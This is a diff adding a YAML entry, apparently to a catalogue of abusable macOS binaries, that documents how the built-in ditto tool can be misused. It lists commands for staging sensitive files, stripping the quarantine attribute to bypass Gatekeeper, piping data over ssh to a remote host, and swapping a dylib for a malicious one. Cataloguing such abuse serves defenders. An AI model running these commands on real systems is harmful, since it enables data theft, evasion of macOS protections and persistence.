@@ -1,0 +1,56 @@
+name: ditto
+author: Brendan Chamberlain (@infosecB)
+short_description: Copies files and directories while preserving file attributes and permissions.
+full_description: ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.
+created: 2023-05-04
+example_use_cases:
+- name: Copy and compress sensitive data locally
+  description: The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.
+  code: ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip
+  tactics:
+  - Collection
+  - Exfiltration
+  tags:
+  - files
+  - compress
+  - recursive
+- name: Remove extended attributes from a file
+  description: ditto can be used to bypass Gatekeeper by removing the "com.apple.quarantine" extended attribute.
+  code: >-
+    ditto -c -k unsigned.app app.zip
+    ditto -x -k app.zip unsigned.app 2>/dev/null
+  tactics:
+  - Collection
+  - Exfiltration
+  tags:
+  - files
+  - compress
+  - recursive
+- name: Copy, compress, and transfer sensitive data to a remote macOS host
+  description: The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.
+  code: ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t
+  tactics:
+  - Collection
+  - Exfiltration
+  - Lateral Movement
+  tags:
+  - files
+- name: DLL hjiacking
+  description: Replace a legitimate library with a malicious one while maintaining the original file permissions and attributes.
+  code: ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib
+  tactics:
+  - Persistence
+  tags:
+  - files
+paths:
+- /usr/bin/ditto
+detections:
+- name: No detection content at time of writing
+  url: N/A
+resources:
+- name: ditto man page
+  url: https://ss64.com/osx/ditto.html
+- name: "Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability"
+  url: https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/
+- name: Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass
+  url: https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/
